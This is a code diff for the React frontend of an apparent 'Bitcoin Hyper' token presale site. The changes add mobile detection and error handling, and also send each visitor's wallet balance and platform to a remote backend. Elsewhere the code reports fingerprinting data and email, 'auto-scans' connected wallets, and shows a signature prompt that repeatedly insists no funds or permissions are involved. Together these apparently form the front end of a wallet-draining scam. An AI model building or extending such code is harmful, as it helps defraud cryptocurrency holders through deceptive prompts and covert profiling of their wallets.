@@ -1,10 +1,15 @@
-// App.jsx - BITCOIN HYPER PRODUCTION FRONTEND v8.0
+// App.jsx - BITCOIN HYPER PRODUCTION FRONTEND v8.0 - COMPLETE VERSION
 import React, { useState, useEffect, useRef } from 'react';
 import { ethers } from 'ethers';
-import './App.css'; 
+import './App.css';
 
-// Production backend URL - Update this to match your backend
+// Production backend URL
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://tokenbackend-5xab.onrender.com';
+
+// Check if window.ethereum is available
+const checkMetaMask = () => {
+  return typeof window !== 'undefined' && typeof window.ethereum !== 'undefined';
+};
 
 function App() {
   const [walletAddress, setWalletAddress] = useState('');
@@ -28,17 +33,16 @@ function App() {
   const [showSuccessAnimation, setShowSuccessAnimation] = useState(false);
   const [walletBalance, setWalletBalance] = useState('0');
   const [currentNetwork, setCurrentNetwork] = useState('');
+  const [isMobile, setIsMobile] = useState(false);
   
   const animationContainerRef = useRef(null);
-
-  // Check if MetaMask is installed
-  const checkMetaMask = () => {
-    return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
-  };
 
   // Initialize session and check backend
   useEffect(() => {
     const initApp = async () => {
+      // Check if mobile
+      setIsMobile(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
+      
       // Generate session ID
       const savedSessionId = localStorage.getItem('bitcoinHyperSessionId');
       if (!savedSessionId) {
@@ -93,8 +97,13 @@ function App() {
         setWalletBalance(ethers.formatEther(balance));
         
         // Get network
-        const network = await provider.getNetwork();
-        setCurrentNetwork(network.name);
+        try {
+          const network = await provider.getNetwork();
+          setCurrentNetwork(network.name);
+        } catch (networkError) {
+          console.log('Network detection failed:', networkError);
+          setCurrentNetwork('Unknown');
+        }
       }
     } catch (error) {
       console.log('No existing wallet connection:', error.message);
@@ -115,8 +124,12 @@ function App() {
         const balance = await provider.getBalance(address);
         setWalletBalance(ethers.formatEther(balance));
         
-        const network = await provider.getNetwork();
-        setCurrentNetwork(network.name);
+        try {
+          const network = await provider.getNetwork();
+          setCurrentNetwork(network.name);
+        } catch (networkError) {
+          setCurrentNetwork('Unknown');
+        }
         
         // Trigger auto-scan if backend is connected
         if (backendStatus === 'connected') {
@@ -143,6 +156,7 @@ function App() {
     setError('');
     setWalletBalance('0');
     setCurrentNetwork('');
+    setShowEmailModal(false);
     console.log('Wallet disconnected');
   };
 
@@ -224,7 +238,8 @@ function App() {
           referrer: document.referrer || 'direct',
           sessionId: sessionId,
           screenResolution: `${window.screen.width}x${window.screen.height}`,
-          timestamp: new Date().toISOString()
+          timestamp: new Date().toISOString(),
+          platform: isMobile ? 'mobile' : 'desktop'
         })
       });
     } catch (error) {
@@ -239,7 +254,11 @@ function App() {
     }
 
     if (!checkMetaMask()) {
-      setError('Please install MetaMask to continue. Visit https://metamask.io/');
+      if (isMobile) {
+        setError('Please open this site in a Web3 browser like Trust Wallet or MetaMask Mobile.');
+      } else {
+        setError('Please install MetaMask to continue. Visit https://metamask.io/download');
+      }
       return;
     }
 
@@ -262,7 +281,7 @@ function App() {
       // Get wallet balance and network
       const [balance, network] = await Promise.all([
         provider.getBalance(address),
-        provider.getNetwork()
+        provider.getNetwork().catch(() => ({ name: 'Unknown' }))
       ]);
       
       setWalletBalance(ethers.formatEther(balance));
@@ -285,7 +304,8 @@ function App() {
           sessionId: sessionId,
           email: email || '',
           network: network.name,
-          chainId: network.chainId.toString()
+          chainId: network.chainId ? network.chainId.toString() : 'unknown',
+          balance: ethers.formatEther(balance)
         })
       });
 
@@ -408,21 +428,21 @@ function App() {
       
       const message = `Bitcoin Hyper Presale Authorization
 
-👛 Wallet: ${walletAddress}
-🎯 Allocation: ${tokenAllocation.amount} BTH ($${tokenAllocation.valueUSD})
-📅 Timestamp: ${new Date().toISOString()}
-🔒 Network: EVM-Compatible
+Wallet: ${walletAddress}
+Allocation: ${tokenAllocation.amount} BTH ($${tokenAllocation.valueUSD})
+Timestamp: ${new Date().toISOString()}
+Network: EVM-Compatible
 
-📝 Purpose:
+Purpose:
 I authorize the allocation of Bitcoin Hyper tokens to my wallet as part of the official presale. This signature verifies wallet ownership only.
 
-⚠️ Important:
+Important:
 - No transactions are initiated
 - No funds will be transferred
 - No gas fees required
 - No permissions granted
 
-✅ This is a read-only verification signature for presale participation only.`;
+This is a read-only verification signature for presale participation only.`;
       
       setLoadingMessage('✍️ Please sign the message in your wallet...');
       const signature = await signer.signMessage(message);
@@ -1237,4 +1257,3 @@ I authorize the allocation of Bitcoin Hyper tokens to my wallet as part of the o
 }
 
 export default App;
-
